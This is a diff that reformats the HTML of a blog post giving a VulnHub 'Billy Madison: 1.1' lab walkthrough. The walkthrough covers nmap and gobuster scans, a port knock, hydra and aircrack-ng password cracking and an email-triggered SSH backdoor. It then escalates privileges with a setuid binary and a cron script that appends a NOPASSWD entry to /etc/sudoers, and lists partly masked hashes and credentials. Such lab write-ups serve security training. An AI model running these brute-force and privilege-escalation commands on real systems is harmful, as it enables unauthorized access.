@@ -1,4 +1,78 @@
-<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>Mannthan</title><link href=/static/images/mannthan-32x32.png sizes=32x32 rel=icon type=image/png><script src=/static/js/highlight.min.js></script><script src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script><link rel=stylesheet href=/static/css/github-gist.min.css><link rel=stylesheet type=text/css href=/static/css/style.md.css media=screen></head><body><div class=header><table><tr><td><a href=/index.html style="color:#fe4164; font-size:14pt;">🏡 Home </a></td><td><a href=/archive.html style="color:#f90; font-size:14pt;">💾 Archive </a></td><td><a href=/tags.html style="color:#69359c; font-size:14pt;">🔖 Tags </a></td><td><a href=/stats.html style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td></tr></table></div><div class=body><h1>[VulnHub] Billy Madison: 1.1</h1><p><a href=/posts/20190831_vulnhub-brainpan.html> « </a>📅 published on <code>05/Sep/2019</code><a href=/posts/20190909_vulnhub-bsidesvancouver2018workshop.html> » </a></p><h2>Overview</h2><p>This is a writeup for VulnHub VM <a href=https://www.vulnhub.com/entry/billy-madison-11,161>Billy Madison: 1.1</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p><p><img alt=writeup.overview.killchain src=/static/files/posts_vulnhub_billymadison1dot1/killchain.png></p><h2>Phase #1: Enumeration</h2><p>1. Here's the Nmap scan result: </p><pre><code># Nmap 7.70 scan initiated Thu Sep  5 17:45:50 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/vulnhub/billymadison1dot1/results/192.168.92.167/scans/_quick_tcp_nmap.txt -oX /root/toolbox/vulnhub/billymadison1dot1/results/192.168.92.167/scans/xml/_quick_tcp_nmap.xml 192.168.92.167
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
+    <meta name="description" content="Personal Weblog"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <title>Mannthan</title>
+    <link href="/static/images/mannthan-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
+    <script src="/static/js/highlight.min.js"></script>
+    <script src="/static/js/highlightjs-line-numbers.min.js"></script>
+    <script charset="UTF-8" src="/static/js/go.min.js"></script>
+    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/style.md.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
+    <link rel="stylesheet" href="/static/css/github-gist.min.css">
+    <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
+   </head>
+  <body>
+    <style>
+      .collapsible {
+        cursor: pointer;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+        width: 100%;
+        border: none;
+        text-align: left;
+        outline: none;
+        cursor: pointer;
+      }
+      .collapsible:after {
+        content: "+";
+        transition: transform .3s ease;
+        display: inline-block;
+        font-weight: bold;
+        float: right;
+      }
+      .expanded::after {
+        content: "-";
+        -ms-transform: rotate(360deg);
+        -webkit-transform: rotate(360deg);
+        transform: rotate(360deg);
+      }
+      .nested {
+        display: none;
+      }
+      .active {
+        display: block;
+      }
+    </style>
+    <div class="header">
+      <table>
+        <tr>
+          <td><a href="/index.html" style="color:#fe4164; font-size:14pt;">🏡 Home </a></td>
+          <td><a href="/archive.html" style="color:#f90; font-size:14pt;">💾 Archive </a></td>
+          <td><a href="/tags.html" style="color:#69359c; font-size:14pt;">🔖 Tags </a></td>
+          <td><a href="/stats.html" style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td>
+        </tr>
+      </table>
+    </div>
+    <div class="body">
+          <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Billy Madison: 1.1</h1>
+                  <p class="nested"><a href="/posts/20190831_vulnhub-brainpan.html"> « </a>📅 published on <code>05/Sep/2019</code><a href="/posts/20190909_vulnhub-bsidesvancouver2018workshop.html"> » </a></p>
+                <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+<p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/billy-madison-11,161">Billy Madison: 1.1</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
+<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_billymadison1dot1/killchain.png" /></p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<p class="nested">1. Here's the Nmap scan result:  </p>
+<p class="nested"re><code># Nmap 7.70 scan initiated Thu Sep  5 17:45:50 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/vulnhub/billymadison1dot1/results/192.168.92.167/scans/_quick_tcp_nmap.txt -oX /root/toolbox/vulnhub/billymadison1dot1/results/192.168.92.167/scans/xml/_quick_tcp_nmap.xml 192.168.92.167
 Nmap scan report for 192.168.92.167
 Host is up, received arp-response (0.00038s latency).
 Scanned at 2019-09-05 17:45:53 PDT for 94s
@@ -62,28 +136,86 @@ Host script results:
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu Sep  5 17:47:28 2019 -- 1 IP address (1 host up) scanned in 97.41 seconds
-</code></pre><p>2. Tried connecting to Telnet service and found a ROT13 encoded string: </p><p><img alt=writeup.enumeration.steps.2.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot01.png> </p><p>3. Decoded the ROT13 (Caesar Cipher) encoded string and used it as the HTTP directory name: </p><pre><code>http://192.168.92.167/exschmenuating
-</code></pre><p><img alt=writeup.enumeration.steps.3.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot02.png> </p><p>4. Found reference to the presence of files with names from <code>rockyou.txt</code> wordlist and <code>veronica</code> string in them. We created a custom wordlist, ran a <code>gobuster</code> scan and found a network capture file: </p><pre><code>gobuster -u http://192.168.92.167/exschmenuating -w veronica.wordlist -e -k -l -s &quot;200,204,301,302,307,403,500&quot; -x &quot;cap,pcap,capture&quot; -o &quot;results/192.168.92.167/scans/tcp_80_http_gobuster_dirbuster.txt&quot; → http://192.168.92.167/exschmenuating/012987veronica.cap
-</code></pre><p><img alt=writeup.enumeration.steps.4.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot03.png> </p><p><img alt=writeup.enumeration.steps.4.2 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot04.png> </p><p>5. Ran a port knock using the <a href="https://www.youtube.com/watch?v=z5YU7JwVy7s">Spanish Armada</a> combo to open the FTP backdoor: </p><pre><code>for port in 1466 67 1469 1514 1981 1986; do nmap -Pn --host_timeout 201 --max-retries 0 -p ${port} 192.168.92.167; done
+</code></pre>
+
+<p class="nested">2. Tried connecting to Telnet service and found a ROT13 encoded string:  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot01.png" />  </p>
+<p class="nested">3. Decoded the ROT13 (Caesar Cipher) encoded string and used it as the HTTP directory name:  </p>
+<p class="nested"re><code>http://192.168.92.167/exschmenuating
+</code></pre>
+
+<p class="nested"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot02.png" />  </p>
+<p class="nested">4. Found reference to the presence of files with names from <code>rockyou.txt</code> wordlist and <code>veronica</code> string in them. We created a custom wordlist, ran a <code>gobuster</code> scan and found a network capture file:  </p>
+<p class="nested"re><code>gobuster -u http://192.168.92.167/exschmenuating -w veronica.wordlist -e -k -l -s &quot;200,204,301,302,307,403,500&quot; -x &quot;cap,pcap,capture&quot; -o &quot;results/192.168.92.167/scans/tcp_80_http_gobuster_dirbuster.txt&quot; → http://192.168.92.167/exschmenuating/012987veronica.cap
+</code></pre>
+
+<p class="nested"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot03.png" />  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.4.2" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot04.png" />  </p>
+<p class="nested">5. Ran a port knock using the <a href="https://www.youtube.com/watch?v=z5YU7JwVy7s">Spanish Armada</a> combo to open the FTP backdoor:  </p>
+<p class="nested"re><code>for port in 1466 67 1469 1514 1981 1986; do nmap -Pn --host_timeout 201 --max-retries 0 -p ${port} 192.168.92.167; done
 nmap -p21 192.168.92.167
-</code></pre><p>6. Found FTP password for user <code>veronica</code> using <code>hydra</code> and the custom wordlist created earlier: </p><pre><code>hydra -l veronica -P veronica.wordlist 192.168.92.167 ftp → veronica/babygirl_veronica07@yahoo.com
-</code></pre><p><img alt=writeup.enumeration.steps.6.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot05.png> </p><p>7. Found FTP password for user <code>eric</code> from the network capture file <code>012987veronica.cap</code>: </p><pre><code>eric/ericdoesntdrinkhisownpee
-</code></pre><p><img alt=writeup.enumeration.steps.7.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot06a.png> </p><p>8. Connected as user <code>eric</code> to the FTP service and found a <code>.notes</code> file: </p><pre><code>ftp://eric@192.168.92.167/.notes
-</code></pre><p><img alt=writeup.enumeration.steps.8.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot06.png> </p><p>9. Found reference to a SSH backdoor that requires sending an email with text <code>My kid will be a **soccer player**</code>: </p><pre><code>swaks --to eric@madisonhotels.com --from vvaughn@polyfector.edu --server 192.168.92.167:2525 --body &quot;My kid will be a soccer player&quot; --header &quot;Subject: My kid will be a soccer player&quot;
-</code></pre><p><img alt=writeup.enumeration.steps.9.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot10.png> </p><p>10. Port <code>1974/tcp</code> is the SSH backdoor placed on the target host by user <code>eric</code>: </p><p><img alt=writeup.enumeration.steps.10.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot11.png> </p><p>11. Found a network capture file <code>eg-01.cap</code> from user <code>veronica</code>'s FTP directory: </p><pre><code>ftp://veronica@192.168.92.167/eg-01.cap
-</code></pre><p><img alt=writeup.enumeration.steps.11.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot09.png> </p><h3>Findings</h3><h4>Open Ports:</h4><pre><code>22/tcp    |  tcpwrapped   |
+</code></pre>
+
+<p class="nested">6. Found FTP password for user <code>veronica</code> using <code>hydra</code> and the custom wordlist created earlier:  </p>
+<p class="nested"re><code>hydra -l veronica -P veronica.wordlist 192.168.92.167 ftp → veronica/babygirl_veronica07@yahoo.com
+</code></pre>
+
+<p class="nested"><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot05.png" />  </p>
+<p class="nested">7. Found FTP password for user <code>eric</code> from the network capture file <code>012987veronica.cap</code>:  </p>
+<p class="nested"re><code>eric/ericdoesntdrinkhisownpee
+</code></pre>
+
+<p class="nested"><img alt="writeup.enumeration.steps.7.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot06a.png" />  </p>
+<p class="nested">8. Connected as user <code>eric</code> to the FTP service and found a <code>.notes</code> file:  </p>
+<p class="nested"re><code>ftp://eric@192.168.92.167/.notes
+</code></pre>
+
+<p class="nested"><img alt="writeup.enumeration.steps.8.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot06.png" />  </p>
+<p class="nested">9. Found reference to a SSH backdoor that requires sending an email with text <code>My kid will be a **soccer player**</code>:  </p>
+<p class="nested"re><code>swaks --to eric@madisonhotels.com --from vvaughn@polyfector.edu --server 192.168.92.167:2525 --body &quot;My kid will be a soccer player&quot; --header &quot;Subject: My kid will be a soccer player&quot;
+</code></pre>
+
+<p class="nested"><img alt="writeup.enumeration.steps.9.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot10.png" />  </p>
+<p class="nested">10. Port <code>1974/tcp</code> is the SSH backdoor placed on the target host by user <code>eric</code>:  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.10.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot11.png" />  </p>
+<p class="nested">11. Found a network capture file <code>eg-01.cap</code> from user <code>veronica</code>'s FTP directory:  </p>
+<p class="nested"re><code>ftp://veronica@192.168.92.167/eg-01.cap
+</code></pre>
+
+<p class="nested"><img alt="writeup.enumeration.steps.11.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot09.png" />  </p>
+<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
+<h4>Open Ports:</h4>
+<p class="nested"re><code>22/tcp    |  tcpwrapped   |
 23/tcp    |  telnet?      |
 69/tcp    |  caldav       |  Radicale calendar and contacts server (Python BaseHTTPServer)
 80/tcp    |  http         |  Apache httpd 2.4.18 ((Ubuntu))
 139/tcp   |  netbios-ssn  |  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp   |  netbios-ssn  |  Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
 2525/tcp  |  smtp         |  SubEtha smtpd
-</code></pre><h4>Files</h4><pre><code>http://192.168.92.167/exschmenuating
+</code></pre>
+
+<h4>Files</h4>
+<p class="nested"re><code>http://192.168.92.167/exschmenuating
 http://192.168.92.167/exschmenuating/012987veronica.cap
-</code></pre><h4>Users</h4><pre><code>ssh: eric, veronica
-</code></pre><h2>Phase #2: Exploitation</h2><p>1. From the storyline so far, user <code>eric</code> has reused WiFi password for SSH login. We need to extract the WiFi password from <code>eg-01.cap</code> file. We run an <code>aircrack</code> scan on the file and get SSH password: </p><pre><code>aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt → triscuit*
-</code></pre><p><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot12.png> </p><p>2. We login as user <code>eric</code> to the SSH backdoor and gain initial shell access: </p><pre><code>ssh -p1974 eric@192.168.92.167
-</code></pre><p><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_vulnhub_billymadison1dot1/writeup.exploitation.screenshot.png> </p><h2>Phase #2.5: Post Exploitation</h2><pre><code>eric@BM&gt; id
+</code></pre>
+
+<h4>Users</h4>
+<p class="nested"re><code>ssh: eric, veronica
+</code></pre>
+
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<p class="nested">1. From the storyline so far, user <code>eric</code> has reused WiFi password for SSH login. We need to extract the WiFi password from <code>eg-01.cap</code> file. We run an <code>aircrack</code> scan on the file and get SSH password:  </p>
+<p class="nested"re><code>aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt → triscuit*
+</code></pre>
+
+<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot12.png" />  </p>
+<p class="nested">2. We login as user <code>eric</code> to the SSH backdoor and gain initial shell access:  </p>
+<p class="nested"re><code>ssh -p1974 eric@192.168.92.167
+</code></pre>
+
+<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_billymadison1dot1/writeup.exploitation.screenshot.png" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<p class="nested"re><code>eric@BM&gt; id
 uid=1002(eric) gid=1002(eric) groups=1002(eric)
 eric@BM&gt;  
 eric@BM&gt; uname
@@ -102,20 +234,94 @@ eric@BM&gt; users
 billy
 veronica
 eric
-</code></pre><h2>Phase #3: Privilege Escalation</h2><p>1. While searching for <code>setuid</code> files we see an uncommon binary: </p><pre><code>find / -type f -perm -04000 2&gt;/dev/null → /usr/local/share/sgml/donpcgd
-</code></pre><p>2. We test this binary and find that it requires two file path parameters. It creates an empty file at path passed as argument #2 with permissions of file passed as argument #1: </p><p><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot13.png> </p><p>3. Used this to create a empty file at file path <code>/etc/cron.hourly/testing</code> with <code>chmod 777</code> permissions. We then added commands to this new file to add user <code>eric</code> to <code>/etc/sudoers</code>: </p><pre><code>touch testing
+</code></pre>
+
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<p class="nested">1. While searching for <code>setuid</code> files we see an uncommon binary:  </p>
+<p class="nested"re><code>find / -type f -perm -04000 2&gt;/dev/null → /usr/local/share/sgml/donpcgd
+</code></pre>
+
+<p class="nested">2. We test this binary and find that it requires two file path parameters. It creates an empty file at path passed as argument #2 with permissions of file passed as argument #1:  </p>
+<p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot13.png" />  </p>
+<p class="nested">3. Used this to create a empty file at file path <code>/etc/cron.hourly/testing</code> with <code>chmod 777</code> permissions. We then added commands to this new file to add user <code>eric</code> to <code>/etc/sudoers</code>:  </p>
+<p class="nested"re><code>touch testing
 chmod 777 testing
 echo -e '#!/bin/bash\necho &quot;eric ALL=(ALL) NOPASSWD:ALL&quot; &gt;&gt;/etc/sudoers' &gt;/etc/cron.hourly/testing
-</code></pre><p><img alt=writeup.privesc.steps.3.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot14.png> </p><p>4. We had to wait for an hour for the <code>cron</code> job to execute and after that running the <code>sudo -l</code> command confirmed that <code>sudoers</code> permissions are now enabled for user <code>eric</code>. We then changed to user <code>root</code>: </p><pre><code>sudo -l
+</code></pre>
+
+<p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot14.png" />  </p>
+<p class="nested">4. We had to wait for an hour for the <code>cron</code> job to execute and after that running the <code>sudo -l</code> command confirmed that <code>sudoers</code> permissions are now enabled for user <code>eric</code>. We then changed to user <code>root</code>:  </p>
+<p class="nested"re><code>sudo -l
 sudo su
-</code></pre><p><img alt=writeup.privesc.steps.4.1 src=/static/files/posts_vulnhub_billymadison1dot1/writeup.privesc.screenshot.png> </p><p>5. We copied <code>BowelMovement</code> and <code>hints.txt</code> files from <code>/PRIVATE/</code> directory to <code>/home/eric/</code> and changed file owner to user <code>eric</code>. Then we download both files locally using <code>scp</code>: </p><pre><code>scp -p1974 eric@192.168.92.167:/home/eric/BowelMovement ./
+</code></pre>
+
+<p class="nested"><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_billymadison1dot1/writeup.privesc.screenshot.png" />  </p>
+<p class="nested">5. We copied <code>BowelMovement</code> and <code>hints.txt</code> files from <code>/PRIVATE/</code> directory to <code>/home/eric/</code> and changed file owner to user <code>eric</code>. Then we download both files locally using <code>scp</code>:  </p>
+<p class="nested"re><code>scp -p1974 eric@192.168.92.167:/home/eric/BowelMovement ./
 scp -p1974 eric@192.168.92.167:/home/eric/hints.txt ./
-</code></pre><p><img alt=writeup.privesc.steps.5.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot15.png> </p><p>6. The <code>hints.txt</code> file hinted at a possible password from the Wikipedia page <a href=https://en.wikipedia.org/wiki/Billy_Madison>BillyMadison</a>. We used <code>cewl</code> to create a wordlist from the wiki page: </p><pre><code>cewl -d0 &quot;https://en.wikipedia.org/wiki/Billy_Madison&quot; &gt;wiki.wordlist
-</code></pre><p><img alt=writeup.privesc.steps.6.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot16.png> </p><p>7. We then ran a password bruteforce on <code>BowelMovement</code> file as a <code>truecrypt</code> encrypted blob using <code>truecrack</code> and found it key: </p><pre><code>truecrack -t BowelMovement -w wiki.wordlist → execrable
-</code></pre><p><img alt=writeup.privesc.steps.7.1 src=/static/files/posts_vulnhub_billymadison1dot1/screenshot17.png> </p><p>8. Mounting the decrypted <code>BowelMovement</code> file reveals a partition with <code>secret.zip</code> that contains both <code>Billy_Madison_12th_Grade_Final_Project.doc</code> and <code>THE-END.txt</code> files. </p><h2>Loot</h2><h3>Hashes</h3><pre><code>billy:$6$eqJNxIDh$oO.ynkHZmLxfr0k8YXHHdbyB4boe2two4HnEiJzzuVEUh0w0paEtVCmHXziHhZIet71QcLqhqnV/iknE/........................
+</code></pre>
+
+<p class="nested"><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot15.png" />  </p>
+<p class="nested">6. The <code>hints.txt</code> file hinted at a possible password from the Wikipedia page <a href="https://en.wikipedia.org/wiki/Billy_Madison">BillyMadison</a>. We used <code>cewl</code> to create a wordlist from the wiki page:  </p>
+<p class="nested"re><code>cewl -d0 &quot;https://en.wikipedia.org/wiki/Billy_Madison&quot; &gt;wiki.wordlist
+</code></pre>
+
+<p class="nested"><img alt="writeup.privesc.steps.6.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot16.png" />  </p>
+<p class="nested">7. We then ran a password bruteforce on <code>BowelMovement</code> file as a <code>truecrypt</code> encrypted blob using <code>truecrack</code> and found it key:  </p>
+<p class="nested"re><code>truecrack -t BowelMovement -w wiki.wordlist → execrable
+</code></pre>
+
+<p class="nested"><img alt="writeup.privesc.steps.7.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot17.png" />  </p>
+<p class="nested">8. Mounting the decrypted <code>BowelMovement</code> file reveals a partition with <code>secret.zip</code> that contains both <code>Billy_Madison_12th_Grade_Final_Project.doc</code> and <code>THE-END.txt</code> files.  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
+<p class="nested"re><code>billy:$6$eqJNxIDh$oO.ynkHZmLxfr0k8YXHHdbyB4boe2two4HnEiJzzuVEUh0w0paEtVCmHXziHhZIet71QcLqhqnV/iknE/........................
 veronica:$6$ud4650Og$j9dN4Xh6nHTDUQ5LpnrUzl6FdRiapcGvjg0JU2/Wx.G5Q.PFtbv.sa4OJyNnzTVsFEMmgnEZQV1nxGFiy........................
 eric:$6$b15/PaMU$VKQussKbrXty79HD4A989SVCn.7.u6bJLMvsFgDSgiM01GlyM/lhb1xF0RcX906O6aIMbP7XoVI2F5UzI........................
-</code></pre><h3>Credentials</h3><pre><code>ftp: veronica/babygirl_veronica07@y........, eric/ericdoesntdrinkhis......
+</code></pre>
+
+<h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
+<p class="nested"re><code>ftp: veronica/babygirl_veronica07@y........, eric/ericdoesntdrinkhis......
 ssh: eric/triscu...
 truecrypt: execrab..
-</code></pre><h2>References</h2><ul><li><a href=https://www.vulnhub.com/entry/billy-madison-11,161/ >https://www.vulnhub.com/entry/billy-madison-11,161/</a> </li><li><a href=https://g0blin.co.uk/billy-madison-1-vulnhub-writeup/ >https://g0blin.co.uk/billy-madison-1-vulnhub-writeup/</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20190831_vulnhub-brainpan.html>[VulnHub] Brainpan: 1...</a> « | » <a href=/posts/20190909_vulnhub-bsidesvancouver2018workshop.html>[VulnHub] BSides Vancouver: 20...</a> »</p></div><div class=footer><p style=text-align:center;><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script></body></html>
+</code></pre>
+
+<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<ul class="nested">
+<li><a href="https://www.vulnhub.com/entry/billy-madison-11,161/">https://www.vulnhub.com/entry/billy-madison-11,161/</a>  </li>
+<li><a href="https://g0blin.co.uk/billy-madison-1-vulnhub-writeup/">https://g0blin.co.uk/billy-madison-1-vulnhub-writeup/</a>  </li>
+</ul>
+        <p class="nested" style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p class="nested" style="text-align:center;">« <a href="/posts/20190831_vulnhub-brainpan.html">[VulnHub] Brainpan: 1...</a> « | » <a href="/posts/20190909_vulnhub-bsidesvancouver2018workshop.html">[VulnHub] BSides Vancouver: 20...</a> »</p>
+            </div>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script>hljs.initLineNumbersOnLoad();</script>
+    <script>
+      function toggle(elem) {
+        elem.classList.toggle("expanded");
+
+        var ish2 = false; var ish3 = false;
+        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }
+        console.log(elem); console.log(ish2); console.log(ish3);
+
+        var sibling = elem.nextElementSibling;
+        while (sibling) {
+          if (ish2 && sibling.classList.contains("h2")) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (sibling.classList.contains("collapsible")) {
+            sibling.classList.toggle("expanded");
+          }
+          sibling.classList.toggle("active");
+          sibling = sibling.nextElementSibling;
+        }
+      }
+    </script>
+    <div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div>
+  </body>
+</html>
